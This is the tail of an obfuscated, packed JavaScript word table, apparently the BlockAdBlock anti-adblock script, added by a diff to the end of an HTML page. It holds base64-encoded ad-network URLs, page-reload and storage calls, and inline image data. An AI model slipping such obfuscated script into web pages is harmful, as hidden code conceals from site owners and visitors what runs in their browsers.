WRUZWFzZXI|YmFubmVyX2Fk|YWRCYW5uZXI|YWRiYW5uZXI|YWRBZA|YmFubmVyYWQ|IGFkX2JveA|Ly9wYWdlYWQyLmdvb2dsZXN5bmRpY2F0aW9uLmNvbS9wYWdlYWQvanMvYWRzYnlnb29nbGUuanM|requestAnimationFrame|Ly93d3cuZ29vZ2xlLmNvbS9hZHNlbnNlL3N0YXJ0L2ltYWdlcy9mYXZpY29uLmljbw|UIWrdVPEp7zHy7oWXiUgmR3kdujbZI73kghTaoaEKMOh8up2M8BVceotd|j9xJVBEEbWEXFVZQNX9|1HX6ghkAR9E5crTgM|0t6qjIlZbzSpemi|MjA3XJUKy|SRWhNsmOazvKzQYcE0hV5nDkuQQKfUgm4HmqA2yuPxfMU1m4zLRTMAqLhN6BHCeEXMDo2NsY8MdCeBB6JydMlps3uGxZefy7EO1vyPvhOxL7TPWjVUVvZkNJ|CGf7SAP2V6AjTOUa8IzD3ckqe2ENGulWGfx9VKIBB72JM1lAuLKB3taONCBn3PY0II5cFrLr7cCp|BNyENiFGe5CxgZyIT6KVyGO2s5J5ce|bTplhb|14XO7cR5WV1QBedt3c|QhZLYLN54|e8xr8n5lpXyn|u3T9AbDjXwIMXfxmsarwK9wUBB5Kj8y2dCw|Kq8b7m0RpwasnR|uJylU|dEflqX6gzC4hd1jSgz0ujmPkygDjvNYDsU0ZggjKBqLPrQLfDUQIzxMBtSOucRwLzrdQ2DFO0NDdnsYq0yoJyEB0FHTBHefyxcyUy8jflH7sHszSfgath4hYwcD3M29I5DMzdBNO2IFcC5y6HSduof4G5dQNMWd4cDcjNNeNGmb02|E5HlQS6SHvVSU0V|F2Q|3eUeuATRaNMs0zfml|I1TpO7CnBZO|1FMzZIGQR3HWJ4F1TqWtOaADq0Z9itVZrg1S6JLi7B1MAtUCX1xNB0Y0oL9hpK4|YbUMNVjqGySwrRUGsLu6|uWD20LsNIDdQut4LXA|KmSx|0nga14QJ3GOWqDmOwJgRoSme8OOhAQqiUhPMbUGksCj5Lta4CbeFhX9NN0Tpny|BKpxaqlAOvCqBjzTFAp2NFudJ5paelS5TbwtBlAvNgEdeEGI6O6JUt42NhuvzZvjXTHxwiaBXUIMnAKa5Pq9SL3gn1KAOEkgHVWBIMU14DBF2OH3KOfQpG2oSQpKYAEdK0MGcDg1xbdOWy||iqKjoRAEDlZ4soLhxSgcy6ghgOy7EeC2PI4DHb7pO7mRwTByv5hGxF|QcWrURHJSLrbBNAxZTHbgSCsHXJkmBxisMvErFVcgE||||x0z6tauQYvPxwT0VM1lH9Adt5Lp|h0GsOCs9UwP2xo6|UimAyng9UePurpvM8WmAdsvi6gNwBMhPrPqemoXywZs8qL9JZybhqF6LZBZJNANmYsOSaBTkSqcpnCFEkntYjtREFlATEtgxdDQlffhS3ddDAzfbbHYPUDGJpGT|UADVgvxHBzP9LUufqQDtV|Ly93d3cuZ3N0YXRpYy5jb20vYWR4L2RvdWJsZWNsaWNrLmljbw|szSdAtKtwkRRNnCIiDzNzc0RO|kmLbKmsE|pyQLiBu8WDYgxEZMbeEqIiSM8r|Uv0LfPzlsBELZ|gkJocgFtzfMzwAAAABJRU5ErkJggg|qdWy60K14k|rgba|onmouseover|boxShadow|35px|14px|24px|8px|screen|marginRight|18pt|45px|999|200|500|hr|1px|borderRadius|12px|background|minWidth|160px|40px|click|split|reverse|join|radius|120|16pt|minHeight|fff|Arial|Black|line|onmouseout|normal|CXRTTQawVogbKeDEs2hs4MtJcNVTY2KgclwH2vYODFTa4FQ|uI70wOsgFWUQCfZC1UI0Ettoh66D|RUIrwGk|EuJ0GtLUjVftvwEYqmaR66JX9Apap6cCyKhiV|data|com|blockadblock|http|9999|innerHeight|clearInterval|head|css|stylesheet|rel|link|base64|onclick|Ly95dWkueWFob29hcGlzLmNvbS8zLjE4LjEvYnVpbGQvY3NzcmVzZXQvY3NzcmVzZXQtbWluLmNzcw|reload|setItem|getItem|Date|now|solid|Ly93d3cuZG91YmxlY2xpY2tieWdvb2dsZS5jb20vZmF2aWNvbi5pY28|Ly9hZHMudHdpdHRlci5jb20vZmF2aWNvbi5pY28|Ly9hZHZlcnRpc2luZy55YWhvby5jb20vZmF2aWNvbi5pY28|png|xlink|oGKmW8DAFeDOxfOJM4DcnTYrtT7dhZltTW7OXHB1ClEWkPO0JmgEM1pebs5CcA2UCTS6QyHMaEtyc3LAlWcDjZReyLpKZS9uT02086vu0tJa|Ly8vKysrDw8O4uLjkt7fhnJzgl5d7e3tkZGTYVlZPT08vLi7OCwu|VOPel7RIdeIBkdo|MgzNFaCVyHVIONbx1EDrtCzt6zMEGzFzFwFZJ19jpJy2qx5BcmyBM|ISwIz5vfQyDF3X|cIa9Z8IkGYa9OGXPJDm5RnMX5pim7YtTLB24btUKmKnZeWsWpgHnzIP5UucvNoDrl8GUrVyUBM4xqQ|ejIzabW26SkqgMDA7HByRAADoM7kjAAAAInRSTlM6ACT4xhkPtY5iNiAI9PLv6drSpqGYclpM5bengkQ8NDAnsGiGMwAABetJREFUWMPN2GdTE1EYhmFQ7L339rwngV2IiRJNIGAg1SQkFAHpgnQpKnZBAXvvvXf9mb5nsxuTqDN|b29vlvb2xn5|Lnx0tILMKp3uvxI61iYH33Qq3M24k|aa2thYWHXUFDUPDzUOTno0dHipqbceHjaZ2dCQkLSLy|PzNzc3myMjlurrjsLDhoaHdf3|v792dnbbdHTZYWHZXl7YWlpZWVnVRkYnJib8|v7|HY9WAzpZLSSCNQrZbGO1n4V4h9uDP7RTiIIyaFQoirfxCftiht4sK8KeKqPh34D2S7TsROHRiyMrAxrtNms9H5Qaw9ObU1H4Wdv8z0J8obvOo|wd4KAnkmbaePspA|sAAADr6|1BMVEXr6|sAAADMAAAsKysKCgokJCRycnIEBATq6uoUFBTMzMzr6urjqqoSEhIGBgaxsbHcd3dYWFg0NDTmw8PZY2M5OTkfHx|enp7TNTUoJyfm5ualpaV5eXkODg7k5OTaamoqKSnc3NzZ2dmHh4dra2tHR0fVQUFAQEDPExPNBQXo6Ohvb28ICAjp19fS0tLnzc29vb25ubm1tbWWlpaNjY3dfX1oaGhUVFRMTEwaGhoXFxfq5ubh4eHe3t7Hx8fgk5PfjY3eg4OBgYF|fn5EREQ9PT3SKSnV1dXks7OsrKypqambmpqRkZFdXV1RUVHRISHQHR309PTq4eHp3NzPz8|iVBORw0KGgoAAAANSUhEUgAAAKAAAAAoCAMAAABO8gGqAAAB|0idvgbrDeBhcK'.split('|'),0,{}));
+</script>
+</body>
+</html>
